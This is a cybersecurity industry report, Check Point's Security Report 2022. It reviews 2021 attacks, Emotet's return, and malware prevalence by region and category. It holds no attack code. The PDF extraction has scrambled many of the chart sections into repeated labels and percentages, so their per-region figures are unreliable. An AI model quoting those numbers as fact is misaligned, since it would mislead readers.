# Cybersecurity Report 2022

## Table of Contents
- [Chapter 1: Introduction to the Check Point 2022 Security Report](#chapter-1-introduction-to-the-check-point-2022-security-report)
- [Chapter 2: Timeline of 2021's Major Cyber Events](#chapter-2-timeline-of-2021s-major-cyber-events)
- [Chapter 3: 2021’s Cyber Security Trends](#chapter-3-2021s-cyber-security-trends)
  - [From SolarWinds to Log4j](#from-solarwinds-to-log4j)
  - [The Fallout of Cyber Attacks](#the-fallout-of-cyber-attacks)
  - [Cloud Services Under Attack](#cloud-services-under-attack)
  - [Mobile Arena Developments](#mobile-arena-developments)
  - [Cracks in the Ransomware Ecosystem](#cracks-in-the-ransomware-ecosystem)
- [Chapter 4: Malware Spotlight: Emotet’s Return](#chapter-4-malware-spotlight-emotets-return)

---

## Chapter 1: Introduction to the Check Point 2022 Security Report

The past twelve months represent one of the most turbulent and disruptive periods on record, at least as far as security is concerned. As governments and businesses around the world continued to navigate the uncharted waters of a global pandemic, the so-called “new normal” still felt a long way off. Digital transformation efforts were dramatically accelerated as businesses embraced hybrid and remote working arrangements, but the same questions around security maturity that plagued many businesses in 2020 persisted through 2021.

Cyberattacks are up by an average of 50% since we issued our last annual report, with the education and research sector suffering the biggest blow, averaging 1,605 attacks every single week throughout the year. As predicted, the infamous SolarWinds breach appears to have kickstarted a trend of supply chain attacks that have persisted throughout the year.

---

## Chapter 2: Timeline of 2021's Major Cyber Events

In 2021, we witnessed an unusually high number of attacks that led to disruptions to individuals’ day-to-day lives, and in some cases even threatened their sense of physical security.

- **January**: US Department of Justice affected by SolarWinds supply-chain attack.
- **February**: Spotify hit by a credential-stuffing attack.
- **March**: Exploitation of Microsoft Exchange Server vulnerabilities (CVE-2021-26855, etc.).
- **April**: Joint advisory regarding Russia-linked APT group, APT29.
- **May**: Colonial Pipeline ransomware attack.
- **June**: JBS meat processing giant hit by REvil ransomware.
- **July**: REvil ransomware targets Kaseya in a supply chain attack.
- **August**: Largest ever DDoS attack (17.2 million requests-per-second) via Mirai botnet.
- **September**: Surge in black market for fake COVID-19 vaccine certificates.
- **October**: REvil ransomware infrastructure compromised and taken down.
- **November**: Emotet botnet returns.
- **December**: Log4j remote code execution vulnerability (CVE-2021-44228) reported.

---

## Chapter 3: 2021’s Cyber Security Trends

### From SolarWinds to Log4j
Throughout 2021, software supply chain attacks grew in both frequency and scale. Researchers concluded that software supply-chain attacks increased by no less than 650% throughout the year. The Log4j zero-day vulnerability (Log4Shell) was the most critical vulnerability of 2021, with Check Point Research detecting 830,000 attack attempts 72 hours into the event.

### The Fallout of Cyber Attacks
Cyberattacks in 2021 had a dramatic impact on organizational performance and public infrastructure. Notable incidents included the Colonial Pipeline shutdown and the JBS ransomware attack. The education sector was the most targeted globally, with a 75% increase in attacks compared to 2020.

### Cloud Services Under Attack
Enterprises are increasingly dependent on cloud vendors. Security flaws discovered in 2021 included:
- **OMIGOD**: Critical vulnerabilities in Microsoft Azure’s OMI.
- **ChaosDB**: Vulnerability in Azure Cosmos DB.
- **Azurescape**: Cross-account vulnerability in Azure Container Instances.
- **Google Compute Engine**: Flaw allowing root access via metadata server impersonation.

### Mobile Arena Developments
Threat actors increased their focus on mobile devices. Key developments included:
- **Pegasus**: Continued scrutiny of NSO Group’s spyware.
- **Predator**: Spyware marketed by Cytrox.
- **SMiShing**: Rise of SMS phishing, notably the FluBot botnet.
- **UltimaSMS**: A massive campaign utilizing 150 Android applications.

### Cracks in the Ransomware Ecosystem
Ransomware-as-a-Service (RaaS) models have matured, but 2021 saw increased pressure from law enforcement. Proactive measures and offensive operations by governments worldwide have managed to put a noticeable dent in the ransomware ecosystem, though the financial incentives ensure the threat will persist into 2022.

---

## Chapter 4: Malware Spotlight: Emotet’s Return

Emotet, one of the most dangerous and infamous botnets in history, is back, despite the long and synchronized efforts of the international community and law enforcement agencies worldwide that resulted in its take down in January 2021. Towards the end of the year, the world came to the realization that even an international task force could only slow Emotet down, not eradicate it.

![Image of Emotet malware analysis chart]

---

hronized efforts of the international community and law enforcement agencies

worldwide that resulted in its take down in January 2021. Emotet, the banking Trojan turned

modular botnet, is known for its massive reach of over 1.5 million infected computers

worldwide, across thousands of compromised corporate networks. Emotet was used as a

distribution platform to deliver other notorious malware families such as TrickBot, Qbot

and Dridex, often resulting in network-wide ransomware attacks that crippled entire

organizations. Inflicted damages were estimated at around US$ 2.5 billion, before it was

forcibly shut down.

3232

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   4

On November 14th, Emotet officially rose from the dead, as live samples were observed

for the first time since its takedown. Emotet’s resurrection came from a surprising

source: TrickBot’s botnet was used to drop Emotet’s samples on machines infected with

the TrickBot malware. The very next day, Emotet returned to its signature method of

distribution, with massive spam campaigns delivering the Trojan via malicious document

attachments. To rebuild their network, Emotet operators chose to drop their spam bot on

successfully infected machines, a method that enabled them to distribute the malware to

even more potential targets.

TrickBot’s service as a dropper was a natural choice for Emotet’s revival, thanks to their

rich history of collaboration. In fact, this might suggest that at least some of its old

malware partners are also involved in its resurrection. TrickBot itself was briefly taken

down in 2020, and yet it persisted and was featured in the Top Malware families rankings

of May, June and September 2021. During the last year, Check Point Research spotted

over 140,000 TrickBot victims worldwide, involving over 200 campaigns and thousands of

compromised networks. This huge installation base makes TrickBot the perfect platform to

re-launch Emotet’s new botnet.

Emotet itself came back even stronger with some new additions to its toolbox. The

upgraded variant uses Elliptic curve cryptography as opposed to RSA cryptography,

improved its control-flow flattening techniques, and added to its initial delivery methods

the use of malicious Windows App installer packages that impersonate legitimate software.

In addition, researchers found that Emotet is now dropping Cobalt Strike beacons directly

for the first time, instead of intermediate malware families which in turn would drop

Cobalt Strike beacons after some time. Cobalt Strike has been the cornerstone of targeted

ransomware attacks in previous years, and this unfortunate development means that the

duration from initial Emotet infection to a full blown ransomware attack just got even

shorter, leaving the defenders with far less time to respond to an ongoing attack.

Since its return, Check Point Research observed that the volume of Emotet’s activity was at

least 50% of the level we saw in January 2021, right before the takedown. This rising trend

continued throughout December with several end-of-the-year campaigns, and is expected

to continue well into 2022, at least until the next takedown attempt.

3333

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

05

GLOBAL STATISTICS

 IN 2021, THERE WAS A 50% INCREASE IN OVERALL ATTACKS PER

WEEK ON CORPORATE NETWORKS COMPARED TO 2020.

34

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CYBER ATTACK CATEGORIES BY REGION

GLOBAL

31%

BOTNET

INFOSTEALER

CRYPTOMINERS

BANKING

MOBILE

14%

RANSOMWARE
8%

21%

19%

19%

Figure 1: Percentage of corporate networks attacked by each malware type globally.

AMERICAS

25%

18%

BOTNET

INFOSTEALER

CRYPTOMINERS

BANKING

MOBILE

RANSOMWARE

6%

15%

15%

14%

Figure 2: Percentage of corporate networks attacked by each malware type in the Americas.

CHECK POINT SOFT WARE  |  SECURITY REPORT 2022
CHECK POINT SOFT WARE  |  SECURITY REPORT 2022

35
3535

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CYBER ATTACK CATEGORIES BY REGION

EMEA

30%

23%

19%

19%

BOTNET

INFOSTEALER

CRYPTOMINERS

BANKING

MOBILE

14%

RANSOMWARE

8%

Figure 3: Percentage of corporate networks attacked by each malware type in EMEA.

APAC

43%

30%

25%

25%

BOTNET

INFOSTEALER

CRYPTOMINERS

BANKING

MOBILE

13%

RANSOMWARE
10%

Figure 4: Percentage of corporate networks attacked by each malware type in APAC.

CHECK POINT SOFT WARE  |  SECURITY REPORT 2022
CHECK POINT SOFT WARE  |  SECURITY REPORT 2022

36
36

C H A P T E R   5

GLOBAL THREAT INDEX MAP

The map displays the cyber threat risk index globally, demonstrating the

main risk areas around the world.*

* Darker = Higher Risk

*  Grey = Insufficient Data

Figure 5. Global Threat Index Map

3737

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

Education / Research

Government / Military

Communications

ISP / MSP

Healthcare

SI / VAR / Distributor

Utilities

Manufacturing

Finance / Banking

Insurance / Legal

Leisure / Hospitality

Consultant

Software Vendor

Retail / Wholesale

Transportation

Hardware Vendor

1605

(+75%)

1136

(+47%)

1079
1068

(+51%)

(+67%)

830

(+71%)

778

(+18%)

736

(+46%)

704
703

(+41%)

(+53%)

636
595
576

(+68%)

(+40%)

(+73%)

536
526
501

(+146%)

(+39%)

(+34%)

367

(+16%)

Figure 6: Average weekly attacks per organization by Industry 2021, compared to 2020.

During 2021, global cyber attacks against corporate networks has increased by

50%, in comparison to 2020. The “Education/Research” category leads as the most

targeted sector, with an average of 1,605 attacks per organization every week

(75% increase), while the “Software Vendor” category shows the largest year-

on-year growth, with an increase of 146%. The rise in attacks against software

vendors goes hand-in-hand with the ever-growing trend of software supply chain

attacks observed during 2021.

3838

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP MALICIOUS FILE T YPES – WEB VS. EMAIL

52%

20%

5%

3%

3%

2%

2%

1%

1%

exe

pdf

doc

xls

xlsx

jar

bat

docx

ps1

Figure 7: Web – Top malicious file types.

10%

other

1%

apk

34%

16%

9%

7%

7%

6%

6%

5%

6%

3%

2%

exe

xlxs

pdf

rtf

doc

xlsm

docx

xls

xlsb

ppt

other

Figure 8: Email – Top malicious file types.

3939

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

2019

2020

2021

36%

64%

17%

16%

83%

84%

EMAIL

WEB

Figure 9: Distribution protocols – email vs web attack vectors during 2019, 2020 & 2021.

The charts above indicate that the email attack

One of the reasons for this rise in email-based

vector has steadily established itself as a

attacks is the massive number of high-profile

favorite, compared to slowly diminishing use of

campaigns sponsored and run by large crime

websites to distribute malware payloads since

groups, who distribute the most prominent

the beginning of 2020.

malware families today, such as TrickBot,

Whether used in a targeted attack, or as part

Dridex, Qbot, IcedID, or Emotet.

of an opportunistic campaign by a novice

Once these gangs realized the effectiveness

attacker, email-based attacks allow for the

of spam campaigns with malicious Office

easy distribution of malware to a wide array of

document attachments, they used it almost

targets and corporations.

exclusively as their main infection vector into

new networks.

4040

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022

C H A P T E R   5

GLOBAL MALWARE STATISTICS
Data comparisons presented in the following sections of this report are based on data drawn from the
Check Point ThreatCloud Cyber Threat Map between January and December 2021.

For each of the regions below, we present the most prevalent malware.

TOP MALWARE FAMILIES

GLOBAL

11.0%

5.2% 5.0% 4.9%

4.4% 4.1% 4.0% 4.0% 3.7% 3.5%

Trickbot

Qbot
Formbook

Emotet

AgentTesla
Dridex

Phorpiex

Remcos

Glupteba

XMRig

Figure 10: Most prevalent malware globally.
Percentage of corporate networks attacked by each malware family.

AMERICAS

9.7%

3.6% 3.5% 3.5%

3.0% 3.0% 2.9%

2.6% 2.4% 2.4%

Trickbot

Remcos

Formbook

Phorpiex

Dridex

Emotet

Qbot

Glupteba

XMRig

Raccoon

Figure 11: Most prevalent malware in the Americas.

4141

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

10.8%

7.8%

5.9%

5.4%

5.0% 4.7%

4.2%

3.6% 3.6% 3.3%

Trickbot

Qbot

Emotet

Dridex

Formbook

AgentTesla

Remcos

Phorpiex

XMRig

Glupteba

Figure 12: Most prevalent malware in EMEA.

ASIA PACIFIC (APAC)

14.5%

7.8% 7.5%

7.1% 6.9%

6.2% 6.0% 5.7%

4.8% 4.8%

Trickbot

Formbook

Ramnit

Glupteba

AgentTesla

Phorpiex

Emotet

XMRig

Dridex

Ursnif

Figure 13: Most prevalent malware in APAC.

4242

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

GLOBAL ANALYSIS OF TOP MALWARE

Some noticeable changes since our last yearly global malware ranking, are that

RigEK (Exploit Kit) and LokiBot infostealer are no longer present in our top 10,

replaced by Glupteba botnet and Remcos RAT.

TrickBot rose to the top of the chart in February, replacing Emotet, and kept this

ranking for the rest of 2021. TrickBot is a modular Botnet and Banking Trojan

that targets the Windows operating system. It is credited with Emotet’s revival

in November 2021 as it was found distributing its fellow malware. TrickBot is

constantly being updated with enhanced capabilities, features and distribution

vectors, making it a flexible and customizable malware that can be distributed

as part of multi-purpose campaigns. It served as a popular means for initial

access in targeted attacks followed by malware such as Ryuk, Conti or Bazar.

Despite TrickBot’s brief takedown in October 2020, it remained prominent in our

top malware charts throughout 2021, and was involved in one of the most serious

ransomware attacks of the year, a Conti ransomware attack on Ireland’s Health

Service Executive.

Phorpiex is a botnet which at its peak controlled more than a million infected

hosts. It is known for distributing other malware families via spam campaigns as

well as fueling large-scale spam, sextortion campaigns or ransomware spread.

Phorpiex, which hit its low mid-year, ended up with a higher ranking by the end of

2021 than it had a year ago. In December, Check Point Research spotted Phorpiex’s

resurgence with a brand-new variant called “Twizt”, which enabled it to operate

in peer-to-peer mode without active C&C servers. In one year, Phorpiex bots

successfully hijacked 969 transactions and stole 3.64 Bitcoin, 55.87 Ether, and US$

55,000 in ERC20 tokens accounting for almost half a million US dollars.

4343

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP BOTNETS

GLOBAL

AMERICAS

12%

12%

12%

10%

12%

29%

10%
10%

10%

12%
13%
12%
13%

29%

14%

13%
14%

13%

10%
TrickBot
10%
Qbot
10%
TrickBot
Emotet
Qbot
Dridex
10%
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
Glupteba

12%

12%

TrickBot

Qbot
TrickBot
Emotet
Qbot
Dridex
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
Glupteba

Other

Other

29%

29%

14%

14%

TrickBot

Phorpiex
TrickBot
Dridex
Phorpiex
Emotet
Dridex
Qbot
Emotet
Glupteba
Qbot
Other
Glupteba

10%

10%

10%

10%

10%

10%

TrickBot

10%

Phorpiex
11%
TrickBot
Dridex
Phorpiex
11%
Emotet
Dridex
Qbot
Emotet
Glupteba
Qbot
Other
Glupteba

11%

11%

10%

11%

11%

11%

11%

11%

11%

35%

35%

35%

35%

12%
11%
12%
11%

12%

12%

Other

Other

Figure 14: Most prevalent botnets globally

Figure 15: Most prevalent botnets in the Americas

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

ASIA PACIFIC (APAC)

9%

9%

8%

9%

8%

9%

27%

8%

9%

27%

27%

27%

23%

23%

23%

23%

TrickBot

TrickBot

27%

27%

13%

27%

27%

13%

13%

6%

6%

9%

Glupteba
TrickBot
Phorpiex
Glupteba
Emotet
Phorpiex
Dridex
Emotet
MyloBot
Dridex
Other
MyloBot

Glupteba
6%
TrickBot
Phorpiex
Glupteba
6%
Emotet
Phorpiex
Dridex
Emotet
MyloBot
Dridex
Other
MyloBot

9%

9%

Other

Other

11%

9%

11%
11%

13%

11%

11%

11%
11%

11%

9%
13%

13%

15%

19%

15%

19%

19%

19%

15%

15%

TrickBot

Qbot
TrickBot
Emotet
Qbot
Dridex
Emotet
Phorpiex
Dridex
Glupteba
Phorpiex
Other
Glupteba

TrickBot
9%

8%

Qbot
TrickBot
9%
Emotet
Qbot
13%
Dridex
Emotet
Phorpiex
13%
Dridex
Glupteba
Phorpiex
Other
Glupteba

Other

Other

Figure 16: Most prevalent botnets in EMEA

Figure 17: Most prevalent botnets in APAC

4444

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

BOTNET GLOBAL ANALYSIS

Overall, we are seeing the same malware families in our top global botnet charts

as 2020, with minor changes to the prevalence of each family. Dridex, for example,

went down from second to fourth place whereas TrickBot rose to first place.

Emotet, one of the most infamous malware groups, has been operating in intervals

since 2014, first as a banking trojan and then later as a botnet. It now appears in

the number three spot on the top botnet chart. Emotet was wide-spread before its

takedown in January 2021, affecting more than 1.5 million machines globally with

damages estimated at around US$ 2.5 billion. It is notorious for spreading other

malware families including TrickBot, Qbot and more.

The Botnet marketplace this year was drastically affected by Emotet’s downfall.

Emotet is one of the largest PC botnet operations and its absence left a vacuum

filled by TrickBot, IcedID, and more recently Phorpiex. On November 15, just

10 months after its takedown, machines infected with TrickBot started to drop

Emotet samples. Computers were increasingly compromised by a large malspam

campaign which leveraged malicious documents containing the Emotet payload.

We note that both our H1 2021 and global 2021 charts showed Emotet in the top

three places, despite nine months of no activity — a tribute to its unequaled power.

4545

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP INFOSTEALER MALWARE

GLOBAL

AMERICAS

16%

16%

16%

16%

13%

13%

13%
9%

13%
9%

38%

38%

7%

7%

9%

7%

9%
8%

9%

7%

8%

8%

8%

9%

9%

9%

Formbook

AgentTesla
Formbook
Raccoon
AgentTesla
LokiBot
Raccoon
Vidar
LokiBot
NanoCore
Vidar
Other
NanoCore

Formbook
38%
AgentTesla
Formbook
38%
Raccoon
AgentTesla
LokiBot
Raccoon
Vidar
LokiBot
NanoCore
Vidar
Other
NanoCore

Other

Other

18%

18%

18%

18%

12%

12%

12%

12%

10%

10%

10%
7%

8%

10%

8%

7%

6%

8%

6%

8%

7%

7%

39%

39%

Formbook

Raccoon
Formbook
AgentTesla
Raccoon
Vidar
AgentTesla
RedLine Stealer
Vidar
LokiBot
RedLine Stealer
Other
LokiBot

Formbook
39%
Raccoon
Formbook
39%
AgentTesla
Raccoon
Vidar
AgentTesla
RedLine Stealer
Vidar
6%
LokiBot
RedLine Stealer
Other
6%
LokiBot

Other

Other

Figure 18: Top infostealer malware globally

Figure 19: Top infostealer malware in the Americas

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

ASIA PACIFIC (APAC)

42%

42%

Formbook

Formbook
42%
AgentTesla
AgentTesla
Formbook
Formbook
LokiBot
LokiBot
42%
AgentTesla
AgentTesla
Raccoon
Raccoon
LokiBot
LokiBot
Vidar
Vidar
Raccoon
Raccoon
Snake Keylogger
Snake Keylogger
Vidar
Vidar
Other
Other
Snake Keylogger
Snake Keylogger

7%

7%

Other

Other

14%

14%

14%

14%

13%

13%

9%

13%

13%

9%

8%
7%
8%
7%

9%
7%

7%

7%

7%

8%

9%

8%

Formbook

AgentTesla
Formbook
LokiBot
AgentTesla
Vidar
LokiBot
NanoCore
Vidar
Raccoon
NanoCore
Other
Raccoon

33%
Formbook

AgentTesla
33%
Formbook
LokiBot
AgentTesla
Vidar
LokiBot
NanoCore
Vidar
Raccoon
NanoCore
Other
Raccoon

7%

7%

Other

Other

33%

33%

7%

8%
7%

8%

7%

7%

18%

18%

18%

18%

16%

16%

16%

16%

11%

11%

7%

7%

8%

8%

11%

11%

Figure 20: Top infostealer malware in EMEA

Figure 21: Top infostealer malware in APAC

4646

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

INFOSTEALER MALWARE GLOBAL ANALYSIS

The infostealer landscape is still dominated by several stealthy malware families.

AgentTesla, a prominent commodity infostealer first discovered in 2014, showed a

significant decrease in prominence compared to 2020, with a drop of 50%. LokiBot,

a commodity infostealer that emerged in 2016, experienced a similar decrease.

Topping the chart is Formbook, a commodity infostealing malware sold as-a-

service on underground forums since 2016. The malware is designed to collect

information via keylogging. In mid-2021, a new Formbook variant was detected

in the wild. The variant was distributed in a phishing campaign leveraging

PowerPoint documents as email attachments for malware delivery.

Another malware-as-a-service that entered our top malware statistics for the

first time is Raccoon. This infostealer, sold on the Dark Web for at least two years,

offers a well-maintained platform for its affiliates that features rapid bug fixes

and automated updates to its payload, as well as malware installed on victim

machines.

Raccoon’s recent updates include the ability to steal cryptocurrency, drop further

malware, and spread via Google SEO instead of phishing emails. The current

campaign attempts to lure its victims by offering cracked software licenses.

4747

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP CRYPTOMINING MALWARE

GLOBAL

AMERICAS

33%

XMRig

33%

XMRig

LemonDuck
XMRig
RubyMiner
LemonDuck
WannaMine
RubyMiner
NRSMiner
WannaMine
Other
NRSMiner

LemonDuck
XMRig
RubyMiner
4%
LemonDuck
WannaMine
6%
RubyMiner
4%
NRSMiner
WannaMine
6%
Other
NRSMiner

Other

Other

33%

33%

4%

6%
8%
6%
8%

6%

4%

6%

43%

43%

6%

6%

8%

8%

27%

27%

27%

27%

XMRig

2%
RubyMiner
2%
XMRig
LemonDuck
2%
7%
RubyMiner
DarkGate
2%
LemonDuck
7%
Kinsing
DarkGate
Other
Kinsing

2%
2%
2%
7%
2%
7%

12%

12%

12%

12%

43%

XMRig

43%

RubyMiner
XMRig
LemonDuck
RubyMiner
DarkGate
LemonDuck
Kinsing
DarkGate
Other
Kinsing

Other

Other

50%

50%

50%

50%

Figure 22: Top cryptomining malware globally

Figure 23: Top cryptomining malware in the Americas

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

ASIA PACIFIC (APAC)

15%

15%

6%

15%

6%

15%

XMRig

42%

XMRig

LemonDuck
XMRig
RubyMiner
LemonDuck
DarkGate
RubyMiner
Kinsing
DarkGate
Other
Kinsing

LemonDuck
42%
XMRig
RubyMiner
LemonDuck
DarkGate
RubyMiner
Kinsing
DarkGate
Other
Kinsing

Other

Other

42%

42%

41%

41%

41%

41%

5%4%3%
5%4%3%

5%
5%4%3%
5%
5%4%3%

5%

5%

XMRig

XMRig

6%

8%

LemonDuck
XMRig
WannaMine
LemonDuck
NRSMiner
WannaMine
RubyMiner
NRSMiner
Other
RubyMiner

LemonDuck
8%
XMRig
WannaMine
13%
LemonDuck
NRSMiner
WannaMine
13%
RubyMiner
NRSMiner
Other
RubyMiner

Other

Other

6%

8%

8%

13%

13%
15%

15%

43%

43%

43%

43%

15%

15%

Figure 24: Top cryptomining malware in EMEA

Figure 25: Top cryptomining malware in APAC

4848

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

CRYPTOMINERS GLOBAL ANALYSIS

XMRig, a legitimate Monero mining tool that was leveraged by threat actors for

malicious purposes, not only continues to top the Cryptominer chart, but also rose

in popularity by over 25% compared to 2020. Two malware families entered the

cryptominer chart for the first time this year: LemonDuck, which is already second

to XMRig, and CryptoBot.

LemonDuck, which showed an over 50% growth in attack rate compared to the

mid-year statistics, is a self-propagating cryptomining botnet that features

credential theft, detection evasion and lateral movement capabilities. LemonDuck

also functions as a malware downloader, and is often observed dropping the

Ramnit Trojan.

CryptoBot is an advanced cryptominer that collects the victim’s wallet and

account information upon infection. In December CryptoBot was observed in a

campaign that targets users with a pirated copy of the Windows operating system.

The campaign leverages a designated activation tool called KMSPico that tricks

Windows Key Management Services (KMS) into authenticating a pirated copy of

Windows as legitimate. When a user downloads a compromised version of the tool,

CryptoBot is silently installed using background processes. Similar to LemonDuck,

CyptoBot was previously detected utilizing the EternalBlue exploit as part of its

infection chain.

4949

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP BANKING TROJANS

GLOBAL

AMERICAS

21%

21%

TrickBot

21%

21%

8%

Qbot
7%
TrickBot
Dridex
7%
Qbot
Ursnif
Dridex
Ramnit
Ursnif
IcedID
Ramnit
Other
IcedID

8%

Other

7%

7%

8%

8%

8%

8%

8%

12%

8%

12%

TrickBot

Qbot
TrickBot
Dridex
Qbot
Ursnif
Dridex
Ramnit
Ursnif
IcedID
Ramnit
Other
IcedID

Other

30%

30%

30%

30%

14%

14%

14%

12%
14%

12%

TrickBot

Dridex
TrickBot
Qbot
Dridex
Ursnif
Qbot
IcedID
Ursnif
Zloader
IcedID
Other
Zloader

Other

TrickBot
5%
Dridex
TrickBot
Qbot
7%
5%
Dridex
Ursnif
Qbot
IcedID
Ursnif
Zloader
IcedID
Other
Zloader

7%

Other

9%

9%

21%

21%

21%

21%

5%

7%
5%

36%

36%

36%

36%

9%

7%
11%

9%

11%

11%
11%
11%
11%

11%

11%

Figure 26: Most prevalent banking Trojans globally

Figure 27: Most prevalent banking Trojans in the Americas

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

ASIA PACIFIC (APAC)

22%

TrickBot

22%

22%

22%

26%

26%

Qbot
5%
TrickBot
Dridex
7%
5%
Qbot
IcedID
Dridex
Ursnif
7%
IcedID
Ramnit
Ursnif
Other
Ramnit

8%

8%

Other

5%

7%
5%

8%

7%
13%

8%

13%

19%

13%

19%

13%

TrickBot

Qbot
TrickBot
Dridex
Qbot
IcedID
Dridex
Ursnif
IcedID
Ramnit
Ursnif
Other
Ramnit

Other

26%

26%

19%

19%

TrickBot

Ramnit
TrickBot
Dridex
Ramnit
Ursnif
Dridex
Qbot
Ursnif
IcedID
Qbot
Other
IcedID

Other

21%

21%

21%

21%

TrickBot
4%

Ramnit
TrickBot
7%
Dridex
4%
Ramnit
Ursnif
Dridex
Qbot
Ursnif
IcedID
Qbot
Other
IcedID

7%

Other

10%

10%

4%

7%
4%

7%

10%

11%

10%

11%

31%

31%

31%

31%

16%
11%
16%
11%

16%

16%

Figure 28: Most prevalent banking Trojans in EMEA

Figure 29: Most prevalent banking Trojans in APAC

5050

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

BANKING TROJANS GLOBAL ANALYSIS

The banking malware landscape continues to be dominated by a collection of

stealthy, adaptive malware families over the past few years. TrickBot climbed from

second place to the top of the global ranks, while Dridex fell from first place to

third, and is down by almost 60% compared to 2020.

Qbot is an ever-evolving banking malware initially designed to collect banking

credentials and keystrokes. It features worm capabilities but also functions as

a botnet, often used by ransomware campaigns to drop malware on infected

devices. In September, Qbot resumed its operations following a three-month

break, executing a large-scale spam campaign that leveraged the malware as a

botnet and infostealer and distributed the ‘SquirrelWaffle’ malware loader. The

recent campaign relied on Visual Basic and Excel 4.0 macros. In November, the

monetization stage of the campaign was observed, as the malware dropper began

installing the Conti Ransomware.

Dridex, yet another banking malware that now features infostealer and botnet

capabilities, showed a significant decrease this year. However, in September

researchers detected a new Dridex variant, with extended information collection

capabilities, spreading in a phishing campaign that features specially crafted Excel

documents. In addition, in December, Dridex was among the first malware to be

distributed in a campaign that exploits the Log4j vulnerability for infection.

5151

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

TOP MOBILE MALWARE

GLOBAL

AMERICAS

34%

34%

Hiddad

Hiddad

34%

34%

29%

29%

29%

29%

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

Other

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

7%

7%

Other

7%

13%

7%

13%

17%

13%

17%

13%

17%

17%

20%

20%

20%

20%

2%

2%

Hiddad

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

Other

Hiddad

2%
16%

16%

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

Other

2%
16%

16%
18%

18%

18%

18%

44%

44%

44%

44%

Figure 30: Top mobile malware globally

Figure 31: Top mobile malware in the Americas

EUROPE, MIDDLE EAST AND AFRICA (EMEA)

ASIA PACIFIC (APAC)

26%

26%

26%

26%

39%

39%

14%

14%

11%

14%

14%

10%

11%

10%

10%

11%

10%

11%

39%

39%
Hiddad

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

Other

Hiddad

xHelper
Hiddad
AlienBot
xHelper
FluBot
AlienBot
Other
FluBot

Other

40%

xHelper

40%

Hiddad
xHelper
AlienBot
Hiddad
FluBot
AlienBot
Other
FluBot

Other

xHelper

Hiddad
xHelper
AlienBot
Hiddad
FluBot
AlienBot
Other
FluBot

Other

30%

30%

30%

30%

40%

40%

3%

3%

3%

3%

11%

11%

16%

11%
16%

11%

16%

16%

Figure 32: Top mobile malware in EMEA

Figure 33: Top mobile malware in APAC

5252

CHECK POINT SOFTWARE  |  SECURITY REPORT 2022CHECK POINT SOFTWARE  |  SECURITY REPORT 2022C H A P T E R   5

MOBILE MALWARE GLOBAL ANALYSIS

Hiddad, an Android malware designed to display ads, previously leveraged the

Covid-19 theme and maintained its place at the top of the ranks, together with

xHelper, whose share of the malware pie decreased by 25% compared to 2020.

This year, two other malware families made it to the chart for the first time, joined

by two brand new malware families: AlienBot and FluBot.

AlienBot is an Android banking malware distributed by threat actors as Malware-

as-a-Service. The malware enables an attacker to remotely inject arbitrary code

into legitimate financial applications, thus gain access to the victims' financial

accounts and eventually completely control their device. In March, Check Point

Research detected a new dropper called ‘Clast82’ distributed via the Google Play

Store that installs AlienBot on victims’ machines. The dropper utilizes a number of

techniques to avoid detection by Google Play Protect. For example, non-malicious

payload is dropped during the evaluation period, and after it passes, the payload is

changed to AlienBot.

FluBot, another Android banking malware, emerged in late 2020, targeting

European users and spreading via SMS messages sent from infected devices.

FluBot campaigns rely on creative themes; a campaign that targeted Finnish

users in June and November leveraged a voicemail theme, asking its victims from

a mobile carrier’s link to listen to messages. Ironically, a campaign aimed at

New Zealand users features a fake security update warning the victims of

FluBot infections.

5353

